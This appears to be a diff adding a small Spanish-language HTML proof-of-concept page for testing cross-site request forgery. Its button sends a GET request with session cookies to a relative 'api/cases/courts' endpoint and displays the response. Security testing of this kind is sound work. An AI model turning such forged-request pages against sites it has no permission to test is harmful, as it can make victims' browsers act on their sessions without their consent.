@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prueba CSRF</title>
+</head>
+<body>
+    <h1>CSRF PoC (Prueba con GET)</h1>
+    <button onclick="enviarCSRF()">Ejecutar CSRF</button>
+
+    <script>
+        function enviarCSRF() {
+            fetch("api/cases/courts", {
+                method: "GET",
+                credentials: "include" // Envía cookies de sesión si existen
+            })
+            .then(response => response.text())
+            .then(data => alert("Respuesta del servidor: " + data))
+            .catch(error => alert("Error: " + error));
+        }
+    </script>
+</body>
+</html>
+
